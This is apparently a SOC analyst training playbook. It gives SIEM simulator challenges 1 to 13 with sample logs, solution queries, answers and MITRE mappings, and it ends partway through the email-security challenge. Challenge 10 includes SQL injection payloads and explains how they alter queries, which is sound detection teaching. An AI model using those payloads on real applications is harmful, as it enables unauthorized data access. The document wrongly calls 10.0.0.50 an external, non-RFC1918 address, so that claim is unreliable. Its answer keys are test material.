# SIEM Simulator - Complete Challenges Playbook

**SOC Analyst Training Guide | 100 Challenges with Solutions**

---
 
## How to Use This Playbook

This document contains **every challenge, solution, and explanation** from the SIEM Simulator. Use it to:

- **Study** - Read through challenges before attempting them
- **Reference** - Look up solutions when stuck
- **Review** - Reinforce learning after solving
- **Interview Prep** - Master explanations for common SOC scenarios

**Study Method:**
1. Try solving the challenge first in the simulator
2. If stuck >10 minutes, check the hint
3. If still stuck, read the solution here
4. After solving, read the full explanation and MITRE mapping
5. Practice explaining the scenario out loud (mock interview)

---

## 4-Day Learning Path

### Day 1: Foundation (Challenges 1-25)
**Focus:** Basic log filtering, authentication monitoring, firewall analysis  
**Time:** 6-8 hours  
**Skills:** SIEM query syntax, log structure, basic threat indicators

### Day 2: Pattern Detection (Challenges 26-50)
**Focus:** Correlating events, detecting attack patterns  
**Time:** 6-8 hours  
**Skills:** Multi-event correlation, lateral movement, data exfiltration

### Day 3: Threat Hunting (Challenges 51-75)
**Focus:** Proactive hunting, incident response workflows  
**Time:** 7-9 hours  
**Skills:** APT detection, IR procedures, forensic timelines

### Day 4: Master Level (Challenges 76-100)
**Focus:** Advanced persistent threats, complex investigations  
**Time:** 8-10 hours  
**Skills:** Supply chain attacks, insider threats, advanced IR

---

# LEVEL 1: BEGINNER (Challenges 1-20)

## Challenge 1: Find Failed Logins

**Category:** Authentication  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
A user reported suspicious login attempts. Find all failed login attempts in the logs.

### Sample Logs
```
[2024-01-15 08:15:23] INFO User admin logged in from 192.168.1.100
[2024-01-15 08:16:45] WARNING Failed login attempt for user admin from 10.0.0.50
[2024-01-15 08:17:12] WARNING Failed login attempt for user admin from 10.0.0.50
[2024-01-15 08:17:45] WARNING Failed login attempt for user admin from 10.0.0.50
[2024-01-15 08:18:23] INFO User john logged in from 192.168.1.105
[2024-01-15 08:19:01] WARNING Failed login attempt for user root from 10.0.0.50
```

### Question
How many failed login attempts are in the logs?

### Solution Query
```
search failed login
```

### Answer
**4**

### Explanation
This challenge teaches basic log filtering. The query searches for events containing the keywords "failed login". There are 4 failed login attempts total:
- 3 attempts targeting user "admin"
- 1 attempt targeting user "root"
- All originating from the same IP: 10.0.0.50

### MITRE ATT&CK Mapping
**T1110 - Brute Force**  
Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained.

### SISA Relevance
SISA SOC analysts monitor authentication logs daily to detect brute force attacks and unauthorized access attempts. This is a fundamental skill for:
- Detecting credential-based attacks
- Identifying compromised accounts
- Triggering incident response procedures
- Blocking malicious IPs at the firewall

### Key Learning Points
1. Failed login attempts are early indicators of attack
2. Multiple failures from the same IP = brute force pattern
3. Different usernames tried = username enumeration
4. SOC response: Block IP, alert security team, check for successful logins after failures

---

## Challenge 2: Identify Source IP

**Category:** Network Analysis  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Security team needs to identify the source IP conducting failed login attempts.

### Sample Logs
```
[2024-01-15 08:15:23] INFO User admin logged in from 192.168.1.100
[2024-01-15 08:16:45] WARNING Failed login attempt for user admin from 10.0.0.50
[2024-01-15 08:17:12] WARNING Failed login attempt for user admin from 10.0.0.50
[2024-01-15 08:17:45] WARNING Failed login attempt for user admin from 10.0.0.50
[2024-01-15 08:18:23] INFO User john logged in from 192.168.1.105
[2024-01-15 08:19:01] WARNING Failed login attempt for user root from 10.0.0.50
```

### Question
What IP address is conducting the failed login attempts?

### Solution Query
```
search failed login from
```

### Answer
**10.0.0.50**

### Explanation
All failed login attempts originate from IP address 10.0.0.50. This IP should be:
1. Immediately blocked at the firewall
2. Added to threat intelligence feeds
3. Investigated for successful logins
4. Checked against known malicious IP databases

The pattern shows systematic brute force behavior:
- Sequential attempts within seconds
- Targeting privileged accounts (admin, root)
- No successful authentication (good - our defenses held)

### MITRE ATT&CK Mapping
**T1110.001 - Password Guessing**  
Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.

### SISA Relevance
Identifying attacker IPs is critical for:
- Firewall rule creation and blocking
- Conducting forensic investigations
- Threat hunting across other systems
- Reporting to management and compliance teams

In SISA's MDR service, this data feeds into:
- Automated blocking systems
- Threat intelligence platforms
- Customer security reports
- Compliance audit evidence

### Key Learning Points
1. Extract attacker IP from log messages
2. IP pattern analysis (internal vs external)
3. 10.0.0.50 is likely external (not RFC1918 internal range like 192.168.x.x)
4. SOC workflow: Extract → Block → Hunt → Report

---

## Challenge 3: Count Critical Events

**Category:** Log Analysis  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Find all critical severity events in the security logs.

### Sample Logs
```
[2024-01-15 09:00:00] INFO Firewall rule updated by admin
[2024-01-15 09:15:23] CRITICAL Malware detected on host WS-001: Trojan.Generic
[2024-01-15 09:20:45] WARNING High CPU usage on server DB-01
[2024-01-15 09:25:12] CRITICAL Unauthorized access attempt to database from 203.0.113.45
[2024-01-15 09:30:00] INFO Backup completed successfully
[2024-01-15 09:35:23] CRITICAL Ransomware encryption activity detected on file server FS-02
```

### Question
How many critical severity events occurred?

### Solution Query
```
search level=critical
```
or
```
search CRITICAL
```

### Answer
**3**

### Explanation
Critical events require immediate SOC analyst attention. The 3 critical events are:

1. **Malware detection on WS-001** (09:15:23)
   - Trojan.Generic detected
   - Action: Isolate host, run full scan, investigate patient zero

2. **Unauthorized database access** (09:25:12)
   - External IP attempting database connection
   - Action: Block IP, review database logs, check for data exfiltration

3. **Ransomware activity on FS-02** (09:35:23)
   - Active encryption detected
   - Action: IMMEDIATE isolation, activate IR plan, check backups

### MITRE ATT&CK Mapping
**Multiple TTPs:**
- T1486 - Data Encrypted for Impact (ransomware)
- T1204 - User Execution (malware)
- T1190 - Exploit Public-Facing Application (database access)

### SISA Relevance
Severity-based prioritization is core to SOC operations:
- **Critical** = Immediate escalation (within 15 minutes)
- **Warning** = Investigate within 1 hour
- **Info** = Logged for correlation

SISA SOC L1 analysts must:
- Triage alerts by severity
- Follow escalation procedures
- Document response actions
- Maintain SLA compliance

### Key Learning Points
1. Log severity levels: INFO < WARNING < CRITICAL
2. Critical events = active threats requiring immediate response
3. Multiple critical events = potential coordinated attack
4. SOC SLA: Critical alerts must be acknowledged within 15 minutes

---

## Challenge 4: Find Firewall Blocks

**Category:** Firewall Analysis  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Network team needs a count of blocked connections from the firewall logs.

### Sample Logs
```
[2024-01-15 10:00:00] INFO Firewall: ALLOW TCP 192.168.1.100:54321 -> 8.8.8.8:443
[2024-01-15 10:00:15] WARNING Firewall: BLOCK TCP 203.0.113.10:12345 -> 192.168.1.50:22
[2024-01-15 10:00:30] INFO Firewall: ALLOW UDP 192.168.1.105:53210 -> 1.1.1.1:53
[2024-01-15 10:00:45] WARNING Firewall: BLOCK TCP 198.51.100.20:23456 -> 192.168.1.50:3389
[2024-01-15 10:01:00] WARNING Firewall: BLOCK TCP 203.0.113.10:12347 -> 192.168.1.50:22
[2024-01-15 10:01:15] INFO Firewall: ALLOW TCP 192.168.1.110:44567 -> 13.107.4.50:443
```

### Question
How many connections were blocked by the firewall?

### Solution Query
```
search Firewall BLOCK
```

### Answer
**3**

### Explanation
Blocked connections indicate:
- Policy violations
- Attack attempts
- Reconnaissance activity
- Misconfigured applications

The 3 blocked connections:

1. **203.0.113.10 → 192.168.1.50:22 (SSH)**
2. **198.51.100.20 → 192.168.1.50:3389 (RDP)**
3. **203.0.113.10 → 192.168.1.50:22 (SSH again)**

**Analysis:**
- Two different external IPs attempting access
- Both targeting the same internal host (192.168.1.50)
- Targeting administrative ports (SSH 22, RDP 3389)
- Pattern suggests coordinated scanning or brute force

### MITRE ATT&CK Mapping
**T1046 - Network Service Scanning**  
Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation.

### SISA Relevance
Firewall log analysis is essential for:
- Detecting perimeter attacks
- Identifying scanning activity
- Validating firewall rules
- Supporting compliance audits

SISA clients rely on firewall monitoring to:
- Detect reconnaissance before exploitation
- Prove compliance (PCI DSS, ISO 27001)
- Document attack attempts for insurance claims
- Optimize security policies

### Key Learning Points
1. Firewall logs format: ACTION PROTOCOL SRC_IP:PORT → DST_IP:PORT
2. BLOCK events = denied by policy or security rules
3. Multiple blocks to same destination = targeted attack
4. Common attack ports: 22 (SSH), 3389 (RDP), 23 (Telnet), 21 (FTP)

---

## Challenge 5: Identify Target Port

**Category:** Port Analysis  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Security analyst needs to know which port is being targeted by external attackers.

### Sample Logs
```
[2024-01-15 10:00:15] WARNING Firewall: BLOCK TCP 203.0.113.10:12345 -> 192.168.1.50:22
[2024-01-15 10:00:45] WARNING Firewall: BLOCK TCP 198.51.100.20:23456 -> 192.168.1.50:3389
[2024-01-15 10:01:00] WARNING Firewall: BLOCK TCP 203.0.113.10:12347 -> 192.168.1.50:22
[2024-01-15 10:01:15] WARNING Firewall: BLOCK TCP 203.0.113.10:12349 -> 192.168.1.50:22
[2024-01-15 10:01:30] WARNING Firewall: BLOCK TCP 203.0.113.10:12351 -> 192.168.1.50:22
```

### Question
Which port is being targeted most frequently?

### Solution Query
```
search BLOCK 192.168.1.50
```

### Answer
**22** (SSH port)

### Explanation
Port 22 (SSH) is being targeted in 4 out of 5 blocked attempts.

**Attack Analysis:**
- **Attacker IP:** 203.0.113.10 (primary)
- **Target:** 192.168.1.50:22 (SSH service)
- **Pattern:** Rapid sequential attempts (within 90 seconds)
- **Technique:** SSH brute force attack

**Why SSH?**
- Remote administration access
- If compromised = full server control
- Common in Linux/Unix environments
- Often has weak passwords

**SOC Response:**
1. Verify SSH is necessary on this host
2. If yes: Implement SSH key authentication, disable password auth
3. If no: Disable SSH service
4. Block 203.0.113.10 at perimeter
5. Check internal logs for any successful SSH sessions

### MITRE ATT&CK Mapping
**T1110.001 - Password Guessing via SSH**  
**T1021.004 - Remote Services: SSH**

### SISA Relevance
Port-based attack analysis helps:
- Identify attack vectors
- Prioritize remediation
- Update firewall rules
- Guide security hardening efforts

For SISA clients:
- SSH brute force is extremely common
- Recommendation: Disable password auth, use key-based only
- Implement fail2ban or similar brute force protection
- Consider moving SSH to non-standard port (security by obscurity, minor benefit)

### Key Learning Points
1. Port numbers indicate service type (22=SSH, 3389=RDP, 443=HTTPS)
2. Repeated attempts to same port = targeted attack
3. Common targeted ports: 22, 3389, 23, 21, 445, 1433, 3306
4. Defense: Disable unnecessary services, use strong auth, implement rate limiting

---

## Challenge 6: DNS Query Analysis

**Category:** DNS Analysis  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Investigate DNS queries to identify potential data exfiltration or C2 communication.

### Sample Logs
```
[2024-01-15 11:00:00] INFO DNS query: google.com from 192.168.1.100
[2024-01-15 11:00:05] INFO DNS query: malicious-c2-server.ru from 192.168.1.105
[2024-01-15 11:00:10] INFO DNS query: microsoft.com from 192.168.1.100
[2024-01-15 11:00:15] INFO DNS query: evil-phishing-site.tk from 192.168.1.105
[2024-01-15 11:00:20] INFO DNS query: github.com from 192.168.1.110
```

### Question
Which host (IP) is making suspicious DNS queries?

### Solution Query
```
search DNS query from
```
or
```
search .ru|.tk
```

### Answer
**192.168.1.105**

### Explanation
Host 192.168.1.105 is querying two suspicious domains:

1. **malicious-c2-server.ru**
   - .ru TLD (often associated with malicious infrastructure)
   - Explicit "c2-server" in name
   - Likely command & control communication

2. **evil-phishing-site.tk**
   - .tk TLD (free domain, commonly abused)
   - "phishing" in domain name
   - Likely compromised host clicking phishing link

**Red Flags:**
- Unusual TLDs (.ru, .tk, .xyz, .top often malicious)
- Obvious malicious naming
- Two suspicious domains from same host = likely compromised

**Immediate Actions:**
1. Isolate 192.168.1.105 from network
2. Run EDR scan for malware
3. Check for data exfiltration
4. Interview user about recent activity
5. Image the system for forensics

### MITRE ATT&CK Mapping
**T1071.004 - Application Layer Protocol: DNS**  
Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering.

**T1566.002 - Phishing: Spearphishing Link**

### SISA Relevance
DNS analysis is critical for detecting:
- Command & control (C2) channels
- Data exfiltration
- Malware callbacks
- Phishing campaign indicators

SISA's threat intelligence feeds flag:
- Known malicious domains
- Suspicious TLDs
- Recently registered domains
- DNS tunneling patterns

### Key Learning Points
1. DNS is often overlooked but critical for detection
2. Suspicious TLDs: .ru, .tk, .cn, .xyz, .top, .pw
3. DNS can be used for C2 and exfiltration
4. SOC tools: DNS sinkholing, threat intel feeds, DNS tunneling detection

---

## Challenge 7: Malware Detection Count

**Category:** Endpoint Security  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
EDR has flagged multiple malware detections. Count the total incidents.

### Sample Logs
```
[2024-01-15 12:00:00] CRITICAL EDR: Malware detected on WS-001: Trojan.Downloader
[2024-01-15 12:05:00] INFO EDR: Clean scan completed on WS-002
[2024-01-15 12:10:00] CRITICAL EDR: Malware detected on WS-003: Ransomware.Cerber
[2024-01-15 12:15:00] WARNING EDR: Suspicious behavior on WS-004: Unsigned driver load
[2024-01-15 12:20:00] CRITICAL EDR: Malware detected on WS-001: Backdoor.Agent
[2024-01-15 12:25:00] INFO EDR: Update completed on WS-005
```

### Question
How many malware detections occurred?

### Solution Query
```
search EDR Malware detected
```

### Answer
**3**

### Explanation
Three confirmed malware detections:

1. **WS-001: Trojan.Downloader** (12:00:00)
   - Downloads additional malware
   - First stage of infection chain

2. **WS-003: Ransomware.Cerber** (12:10:00)
   - File encryption ransomware
   - Critical threat - immediate isolation required

3. **WS-001: Backdoor.Agent** (12:20:00)
   - Same host as Trojan.Downloader
   - Downloader likely fetched this backdoor
   - Confirms multi-stage attack

**Critical Observation:**
WS-001 appears TWICE:
- First: Trojan.Downloader
- Later: Backdoor.Agent
- Classic infection chain: downloader → backdoor → persistence

**Incident Response Priority:**
1. **Immediate:** Isolate WS-001 (fully compromised) and WS-003 (ransomware)
2. **Urgent:** Investigate WS-004 (suspicious behavior, possible compromise)
3. **Monitor:** WS-002, WS-005 (clean, but check for lateral movement)

### MITRE ATT&CK Mapping
**T1204 - User Execution**  
**T1105 - Ingress Tool Transfer** (Trojan.Downloader)  
**T1486 - Data Encrypted for Impact** (Ransomware)  
**T1543 - Create or Modify System Process** (Backdoor persistence)

### SISA Relevance
EDR log analysis is daily SOC L1 work. SISA's MDR service monitors:
- Real-time malware alerts
- Behavior-based detections
- File reputation
- Process execution chains

Critical for:
- Rapid incident response
- Preventing ransomware spread
- Forensic investigation
- Compliance reporting (breach notification)

### Key Learning Points
1. Malware types: Trojan (payload delivery), Ransomware (encryption), Backdoor (persistence)
2. Multi-stage infections: Downloader → Payload → Persistence
3. Same host, multiple detections = active compromise
4. EDR is last line of defense - detection means other controls failed

---

## Challenge 8: Find Affected Hostname

**Category:** Incident Response  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Identify which workstation has multiple malware detections.

### Sample Logs
```
[2024-01-15 12:00:00] CRITICAL EDR: Malware detected on WS-001: Trojan.Downloader
[2024-01-15 12:05:00] INFO EDR: Clean scan completed on WS-002
[2024-01-15 12:10:00] CRITICAL EDR: Malware detected on WS-003: Ransomware.Cerber
[2024-01-15 12:15:00] WARNING EDR: Suspicious behavior on WS-004: Unsigned driver load
[2024-01-15 12:20:00] CRITICAL EDR: Malware detected on WS-001: Backdoor.Agent
[2024-01-15 12:25:00] INFO EDR: Update completed on WS-005
```

### Question
Which workstation appears twice in malware detections?

### Solution Query
```
search Malware detected on
```

### Answer
**WS-001**

### Explanation
WS-001 has TWO confirmed malware detections within 20 minutes:

**Timeline:**
- 12:00:00 - Trojan.Downloader detected
- 12:20:00 - Backdoor.Agent detected

**Attack Analysis:**
This is a classic **multi-stage attack**:

1. **Initial Infection** (12:00:00)
   - User executes malicious file (likely phishing attachment)
   - Trojan.Downloader installed

2. **Second Stage Payload** (12:20:00)
   - Downloader fetches Backdoor.Agent from C2 server
   - Backdoor establishes persistence
   - Attacker now has remote access

**Incident Response Actions:**

**Immediate (Within 5 minutes):**
1. Network isolation - disconnect WS-001 from network
2. Do NOT shut down (preserve memory for forensics)
3. Alert security team and management
4. Document current state (screenshots, running processes)

**Investigation (Within 1 hour):**
1. Memory dump for forensic analysis
2. Check for lateral movement to other hosts
3. Review user activity logs
4. Scan network for C2 beaconing
5. Identify patient zero (initial infection vector)

**Containment & Recovery:**
1. Wipe and rebuild WS-001
2. Reset user credentials
3. Block C2 domains/IPs at firewall
4. Deploy additional monitoring
5. User security awareness training

### MITRE ATT&CK Mapping
**Kill Chain:**
1. T1566 - Phishing (initial access)
2. T1204 - User Execution (downloader)
3. T1105 - Ingress Tool Transfer (fetch backdoor)
4. T1543 - Persistence (backdoor installation)

### SISA Relevance
Identifying fully compromised hosts is **critical** for:
- Preventing data breach
- Stopping lateral movement
- Forensic investigation
- Compliance reporting

SISA incident response SOP:
1. Isolate immediately
2. Preserve evidence
3. Contain spread
4. Forensic analysis
5. Remediate
6. Document & report

### Key Learning Points
1. Multiple malware detections on same host = active compromise
2. Time gap between detections = multi-stage attack
3. Isolation is FIRST action, not shutdown
4. Memory forensics must happen before reboot/shutdown
5. Rebuild, don't just "clean" - malware may have rootkits/persistence

---

## Challenge 9: Web Server Error Analysis

**Category:** Web Security  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Analyze web server logs to count HTTP error responses.

### Sample Logs
```
[2024-01-15 13:00:00] INFO HTTP 200 GET /index.html from 192.168.1.100
[2024-01-15 13:00:05] WARNING HTTP 404 GET /admin.php from 203.0.113.50
[2024-01-15 13:00:10] INFO HTTP 200 GET /api/users from 192.168.1.105
[2024-01-15 13:00:15] WARNING HTTP 403 GET /secret/config.php from 203.0.113.50
[2024-01-15 13:00:20] CRITICAL HTTP 500 POST /login from 192.168.1.110
[2024-01-15 13:00:25] WARNING HTTP 404 GET /wp-admin from 203.0.113.50
```

### Question
How many HTTP errors (4xx or 5xx) were logged?

### Solution Query
```
search HTTP 4|5
```
or
```
search HTTP 404|403|500
```

### Answer
**4**

### Explanation
HTTP errors breakdown:

**4xx - Client Errors (3 total):**
1. **404** - /admin.php (not found)
2. **403** - /secret/config.php (forbidden)
3. **404** - /wp-admin (not found)

**5xx - Server Errors (1 total):**
4. **500** - POST /login (internal server error)

**Security Analysis:**

**External IP 203.0.113.50 is scanning:**
- Trying /admin.php (common admin panel)
- Trying /secret/config.php (looking for config files)
- Trying /wp-admin (WordPress admin)
- Pattern = web application scanning/enumeration

**Internal error (500 on /login):**
- From internal IP 192.168.1.110
- POST request = login attempt
- 500 error = server-side failure
- Could indicate: SQL injection, application bug, or database issue

### HTTP Status Codes Reference
- **200** - OK (successful request)
- **403** - Forbidden (no permission)
- **404** - Not Found (page doesn't exist)
- **500** - Internal Server Error (server-side problem)
- **503** - Service Unavailable (server overloaded/down)

### MITRE ATT&CK Mapping
**T1190 - Exploit Public-Facing Application**  
**T1595.002 - Active Scanning: Vulnerability Scanning**

### SISA Relevance
Web server log analysis detects:
- Application scanning and enumeration
- Exploitation attempts
- Information disclosure
- Application errors (potential vulnerabilities)

SISA web application security assessments review:
- 404 patterns (reveals site structure)
- 403 errors (sensitive paths exist but protected)
- 500 errors (application bugs, potential SQLi)
- Unusual user agents and request patterns

### Key Learning Points
1. HTTP 4xx = client error (attacker's fault)
2. HTTP 5xx = server error (our fault - investigate)
3. Multiple 404s from external IP = reconnaissance
4. Paths attempted reveal attacker knowledge (/wp-admin = knows it's WordPress)
5. 500 on /login = investigate for SQLi or application bug

---

## Challenge 10: SQL Injection Detection

**Category:** Web Attacks  
**Difficulty:** Beginner  
**Points:** 15

### Scenario
Detect potential SQL injection attempts in web application logs.

### Sample Logs
```
[2024-01-15 14:00:00] INFO Web request: GET /search?q=laptops from 192.168.1.100
[2024-01-15 14:00:05] WARNING Web request: GET /search?q=' OR '1'='1 from 203.0.113.75
[2024-01-15 14:00:10] INFO Web request: POST /login username=admin from 192.168.1.105
[2024-01-15 14:00:15] WARNING Web request: GET /api/user?id=1 UNION SELECT password from 203.0.113.75
[2024-01-15 14:00:20] INFO Web request: GET /products?category=electronics from 192.168.1.110
```

### Question
How many potential SQL injection attempts were detected?

### Solution Query
```
search OR UNION SELECT
```
or
```
search '1'='1|UNION SELECT
```

### Answer
**2**

### Explanation
Two SQL injection attempts from 203.0.113.75:

**Attack 1: Authentication Bypass** (14:00:05)
```
/search?q=' OR '1'='1
```
**Technique:** Classic SQLi authentication bypass  
**How it works:**
- Injects `' OR '1'='1` into query
- Makes SQL query always true
- Example vulnerable query:
  ```sql
  SELECT * FROM users WHERE username='$input'
  ```
- Becomes:
  ```sql
  SELECT * FROM users WHERE username='' OR '1'='1'
  ```
- Returns all users (bypasses authentication)

**Attack 2: Data Extraction** (14:00:15)
```
/api/user?id=1 UNION SELECT password
```
**Technique:** UNION-based SQL injection  
**How it works:**
- Uses UNION to append another SELECT query
- Extracts data from other tables
- Example vulnerable query:
  ```sql
  SELECT name, email FROM users WHERE id=$input
  ```
- Becomes:
  ```sql
  SELECT name, email FROM users WHERE id=1 UNION SELECT password, null FROM users
  ```
- Returns password column data

### SQL Injection Detection Keywords
- **OR** - logical operator for bypass
- **UNION** - combine multiple SELECT statements
- **SELECT** - query data
- **'1'='1'** - always-true condition
- **-- (double dash)** - SQL comment to ignore rest of query
- **;** - statement separator (for stacked queries)

### MITRE ATT&CK Mapping
**T1190 - Exploit Public-Facing Application**  
Adversaries may attempt to exploit weaknesses in SQL implementations to gain unauthorized access to data or execute arbitrary commands.

### SISA Relevance
SQL injection is a **critical** web application vulnerability:
- OWASP Top 10 #1 (Injection)
- Can lead to full database compromise
- Data breach notification trigger
- PCI DSS compliance violation if customer data exposed

SISA penetration testing includes:
- Automated SQLi scanning
- Manual exploitation testing
- Code review for parameterized queries
- WAF bypass testing

**Immediate Response:**
1. Block 203.0.113.75 at WAF/firewall
2. Review application logs for successful exploitation
3. Check database logs for unauthorized queries
4. Patch application (use parameterized queries)
5. Deploy WAF rules to block SQLi patterns

### Key Learning Points
1. SQLi allows attackers to manipulate database queries
2. Detection: Look for SQL keywords in GET/POST parameters
3. Common SQLi patterns: OR 1=1, UNION SELECT, ' OR '
4. Defense: Parameterized queries (prepared statements), input validation, WAF
5. Never trust user input - always sanitize and validate

---

## Challenge 11: Identify Scanning Activity

**Category:** Network Scanning  
**Difficulty:** Beginner  
**Points:** 15

### Scenario
Detect port scanning activity in firewall logs.

### Sample Logs
```
[2024-01-15 15:00:00] WARNING Firewall: BLOCK TCP 198.51.100.10:54321 -> 192.168.1.50:21
[2024-01-15 15:00:01] WARNING Firewall: BLOCK TCP 198.51.100.10:54322 -> 192.168.1.50:22
[2024-01-15 15:00:02] WARNING Firewall: BLOCK TCP 198.51.100.10:54323 -> 192.168.1.50:23
[2024-01-15 15:00:03] WARNING Firewall: BLOCK TCP 198.51.100.10:54324 -> 192.168.1.50:80
[2024-01-15 15:00:04] WARNING Firewall: BLOCK TCP 198.51.100.10:54325 -> 192.168.1.50:443
[2024-01-15 15:00:05] INFO Firewall: ALLOW TCP 192.168.1.100:44567 -> 8.8.8.8:443
```

### Question
What IP is conducting the port scan?

### Solution Query
```
search BLOCK 198.51.100
```

### Answer
**198.51.100.10**

### Explanation
Clear port scanning pattern from 198.51.100.10:

**Scan Analysis:**
- **Target:** 192.168.1.50 (single host)
- **Timeframe:** 5 seconds (1-second intervals)
- **Ports scanned:** 21, 22, 23, 80, 443
- **Source ports:** Sequential (54321-54325)
- **Technique:** TCP connect scan (nmap default)

**Ports Targeted:**
1. **Port 21** - FTP (File Transfer Protocol)
2. **Port 22** - SSH (Secure Shell)
3. **Port 23** - Telnet (unencrypted remote access)
4. **Port 80** - HTTP (Web server)
5. **Port 443** - HTTPS (Secure web server)

**Scan Type Indicators:**
- Sequential ports = ordered scan (nmap -p 21-443)
- 1-second timing = default nmap timing
- Single target = targeted reconnaissance
- All blocked = firewall working correctly

**Attack Kill Chain Phase:**
This is **Phase 1: Reconnaissance**
- Attacker mapping open services
- Next phases will be: Exploitation → Access → Persistence

### MITRE ATT&CK Mapping
**T1046 - Network Service Scanning**  
Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure, including those that may be vulnerable to remote software exploitation.

### SISA Relevance
Port scan detection is **essential** for:
- Early attack detection (recon phase)
- Proactive blocking before exploitation
- Understanding attacker intent
- Identifying vulnerable services

SISA MDR response to port scans:
1. Automatic IP blocking after 3+ sequential port attempts
2. Alert to SOC analyst for investigation
3. Threat intelligence lookup (known scanner?)
4. Check for any ALLOW connections from same IP
5. Document for compliance reporting

**Why This Matters:**
- Scanning is **always** malicious from external IPs
- Indicates attacker awareness of target
- Precedes exploitation attempts
- Early detection = prevent breach

### Key Learning Points
1. Port scanning patterns: Sequential ports, rapid timing, single source
2. Common nmap scan: -sT (TCP connect), -sS (SYN scan)
3. Defense: IDS/IPS with scan detection, automatic IP blocking
4. SOC action: Block IP, alert team, monitor for exploitation attempts
5. Reconnaissance is Phase 1 of cyber kill chain - stop attacks early

---

## Challenge 12: VPN Connection Analysis

**Category:** Remote Access  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Monitor VPN logs for unauthorized access attempts.

### Sample Logs
```
[2024-01-15 16:00:00] INFO VPN: User alice connected from 203.0.113.100
[2024-01-15 16:05:00] WARNING VPN: Failed authentication for user admin from 198.51.100.20
[2024-01-15 16:10:00] INFO VPN: User bob connected from 203.0.113.105
[2024-01-15 16:15:00] WARNING VPN: Failed authentication for user admin from 198.51.100.20
[2024-01-15 16:20:00] WARNING VPN: Failed authentication for user root from 198.51.100.20
```

### Question
How many failed VPN authentication attempts occurred?

### Solution Query
```
search VPN Failed authentication
```

### Answer
**3**

### Explanation
Three failed VPN authentication attempts, all from 198.51.100.20:

**Attack Timeline:**
1. **16:05:00** - Failed auth for "admin"
2. **16:15:00** - Failed auth for "admin" (retry)
3. **16:20:00** - Failed auth for "root"

**Attack Pattern:**
- Same source IP (198.51.100.20)
- Targeting privileged accounts (admin, root)
- 5-minute intervals between attempts
- Deliberate, not automated brute force

**Legitimate vs. Malicious:**
- Legitimate users: alice (203.0.113.100), bob (203.0.113.105)
- Different IPs from successful connections
- Attacker IP (198.51.100.20) only has failures

**Security Concerns:**
1. How did attacker know valid usernames? (Information disclosure)
2. VPN exposed to internet (is this necessary?)
3. No account lockout after failures
4. Privileged accounts targeted

### MITRE ATT&CK Mapping
**T1078 - Valid Accounts**  
Adversaries may obtain and abuse credentials of existing accounts as a means of gaining initial access, persistence, privilege escalation, or defense evasion.

**T1133 - External Remote Services**  
Adversaries may leverage external-facing remote services to initially access and/or persist within a network (VPN, Citrix, etc.)

### SISA Relevance
VPN monitoring is **critical** for remote workforce security:
- Primary attack vector for remote access
- Credential stuffing attacks common
- MFA bypass attempts
- Unauthorized access to corporate network

SISA recommendations:
1. **Multi-Factor Authentication (MFA)** - MANDATORY
2. **Geo-blocking** - Restrict VPN to expected countries
3. **Account lockout** - 3 failures = 30-minute lockout
4. **IP allowlisting** - Known good IPs bypass MFA
5. **Session monitoring** - Detect concurrent logins

**Post-COVID Reality:**
- VPN is now primary access method
- Attack surface dramatically increased
- Monitoring VPN = monitoring network perimeter
- Failed VPN auth = potential breach attempt

### Key Learning Points
1. VPN failures from unknown IPs = attack attempts
2. Targeting admin/root = privilege escalation intent
3. MFA prevents credential-based VPN attacks
4. Geo-blocking reduces attack surface
5. SOC monitors: Failed auth, impossible travel, concurrent sessions

---

## Challenge 13: Email Security Gateway

**Category:** Email Security  
**Difficulty:** Beginner  
**Points:** 10

### Scenario
Analyze email gateway logs to find blocked malicious emails.

### Sample Logs
```
[2024-01-15 17:00:00] INFO Email: Delivered to alice@company.com from partner@vendor.com
[2024-01-15 17:05:00] WARNING Email: BLOCKED to bob@company.com from phishing@evil.ru - Malicious attachment
[2024-01-15 17:10:00] INFO Email: Delivered to charlie@company.com from newsletter@service.com
[2024-01-15 17:15:00] WARNING Email: BLOCKED to alice@company.com from scam@suspicious.tk - Phishing URL detected
[2024-01-15 17:20:00] INFO Email: Delivered to dave@company.com from hr@company.com
```

### Question
How many emails were blocked by the email gateway?

### Solution Query
```
search Email BLOCKED
```

### Answer
**2**

### Explanation
Two malicious emails successfully blocked:

**Email 1: Malicious Attachment** (17:05:00)
- **To:** bob@company.com
- **From:** phishing@evil.ru
- **Threat:** Malicious attachment
- **Likely:** Malware (Trojan, Ransomware, Backdoor)

**Email 2: Phishing URL** (17:15:00)
- **To:** alice@company.com
- **From:** scam@suspicious.tk
- **Threat:** Phishing URL detected
- **Likely:** Credential harvesting site

**Red Flags:**
- .ru and .tk domains (commonly malicious)
- Generic sender names (phishing@, scam@)
- Multiple attack vectors (attachment + URL)

**What Would Have Happened Without Email Gateway:**
1. Bob receives malicious attachment
2. Bob opens attachment (70% chance - user behavior studies)
3. Malware executes, compromises WS-BOB
4. Ransomware spreads across network
5. Business disruption, data breach, ransom demand

### Email Threat Types
1. **Malicious Attachments:**
   - .exe, .scr, .bat (executables)
   - .doc/.docx with macros
   - .zip containing executables
   - PDF exploits

2. **Phishing URLs:**
   - Credential harvesting
   - Drive-by downloads
   - Fake login pages
   - Malvertising

3. **Business Email Compromise (BEC):**
   - CEO fraud
   - Invoice scams
   - Wire transfer fraud

### MITRE ATT&CK Mapping
**T1566.001 - Phishing: Spearphishing Attachment**  
**T1566.002 - Phishing: Spearphishing Link**  
**Initial Access Tactic**

### SISA Relevance
Email security is **the #1 attack vector:**
- 90%+ of breaches start with phishing
- Ransomware delivery via email
- Credential theft through fake login pages
- BEC causes millions in losses

SISA email security services:
- Advanced threat protection (ATP)
- Sandbox analysis of attachments
- URL rewriting and scanning
- DMARC/SPF/DKIM validation
- User awareness training

**Defense Layers:**
1. Email gateway (blocks known threats)
